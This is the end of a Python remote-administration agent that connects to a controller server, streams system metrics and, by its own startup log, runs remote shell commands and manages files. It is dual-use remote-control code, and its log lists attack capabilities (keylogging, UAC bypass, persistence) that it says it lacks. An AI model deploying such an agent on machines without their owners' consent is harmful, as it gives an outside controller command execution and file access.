def on_key_press(data):
    """Handle remote key press - NOT AVAILABLE in pure agent"""
    try:
        key = data.get('key', '')
        log(f"Remote key press requested: {key}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Remote control not available in pure agent (requires pynput/keyboard libraries)',
            'success': False,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling key_press: {e}")

@sio.on('mouse_move')
def on_mouse_move(data):
    """Handle remote mouse move - NOT AVAILABLE in pure agent"""
    try:
        x = data.get('x', 0)
        y = data.get('y', 0)
        log(f"Remote mouse move requested: ({x}, {y})")
        # Pure agent doesn't support remote control
    except Exception as e:
        log(f"Error handling mouse_move: {e}")

@sio.on('mouse_click')
def on_mouse_click(data):
    """Handle remote mouse click - NOT AVAILABLE in pure agent"""
    try:
        button = data.get('button', 'left')
        log(f"Remote mouse click requested: {button}")
        # Pure agent doesn't support remote control
    except Exception as e:
        log(f"Error handling mouse_click: {e}")

# ═══════════════════════════════════════════════════════════════════
# PERFORMANCE & STATUS UPDATES
# ═══════════════════════════════════════════════════════════════════

def performance_update():
    """Send periodic performance updates to controller"""
    while True:
        try:
            if sio.connected:
                info = get_system_info()
                sio.emit('performance_update', {
                    'agent_id': AGENT_ID,
                    'cpu': info.get('cpu_usage', 0),
                    'memory': info.get('memory_percent', 0),
                    'disk': info.get('disk_percent', 0),
                    'network': 0,
                    'timestamp': time.time()
                })
            time.sleep(15)  # Update every 15 seconds
        except Exception as e:
            log(f"Performance update error: {e}")
            time.sleep(15)

def main():
    """Main entry point"""
    log("=" * 70)
    log("Pure Agent - Enhanced Edition")
    log("=" * 70)
    log(f"Agent ID: {AGENT_ID}")
    log(f"Hostname: {AGENT_INFO['hostname']}")
    log(f"OS: {AGENT_INFO['os']} {AGENT_INFO['os_version']}")
    log(f"User: {AGENT_INFO['username']}")
    log(f"Server: {SERVER_URL}")
    log("=" * 70)
    log("")
    log("✅ Command Execution:")
    log("  ✓ CMD commands (native Windows)")
    log("  ✓ PowerShell commands (auto-detected)")
    log("  ✓ Unix commands (auto-translated: ls→dir, pwd→cd, etc.)")
    log("  ✓ Clean formatted output")
    log("")
    log("✅ File Management:")
    log("  ✓ Browse directories")
    log("  ✓ Read file contents")
    log("  ✓ Upload files")
    log("  ✓ Download files")
    log("  ✓ Delete files/folders")
    log("")
    log("✅ System Monitoring:")
    log("  ✓ Real-time CPU/Memory/Disk metrics")
    log("  ✓ Process list with details")
    log("  ✓ Network statistics")
    log("  ✓ System metrics streaming")
    log("  ✓ Kill processes")
    log("")
    log("✅ Advanced Features:")
    log("  ✓ Live system metrics stream (2-second updates)")
    log("  ✓ Detailed per-core CPU stats")
    log("  ✓ Disk partition information")
    log("  ✓ Top processes by CPU/Memory")
    log("")
    log("❌ NOT Available (Ethical/Clean Agent):")
    log("  ✗ Screen/Camera/Audio capture")
    log("  ✗ Keylogging")
    log("  ✗ UAC bypasses")
    log("  ✗ Persistence mechanisms")
    log("  ✗ Registry modifications")
    log("")
    log("This is a CLEAN agent - No UAC, No Persistence, No Escalation")
    log("Enhanced with File Management, Monitoring & Streaming!")
    log("")
    log("=" * 70)
    
    # Start background threads
    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
    heartbeat_thread.start()
    
    status_thread = threading.Thread(target=status_update, daemon=True)
    status_thread.start()
    
    performance_thread = threading.Thread(target=performance_update, daemon=True)
    performance_thread.start()
    
    # Connect to controller
    while True:
        try:
            log(f"Connecting to controller at {SERVER_URL}...")
            sio.connect(SERVER_URL, transports=['websocket', 'polling'])
            
            log("✅ Successfully connected!")
            log("Waiting for commands from controller...")
            log("The agent will appear in the controller UI")
            log("")
            
            # Keep connection alive
            sio.wait()
            
        except KeyboardInterrupt:
            log("\nShutting down...")
            break
        except Exception as e:
            log(f"❌ Connection error: {e}")
            log("Retrying in 10 seconds...")
            time.sleep(10)
    
    # Cleanup
    if sio.connected:
        sio.disconnect()
    
    log("Agent stopped - No cleanup needed (no persistence)")
    log("No registry entries, no scheduled tasks, no files left behind")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nAgent stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {e}")
        sys.exit(1)
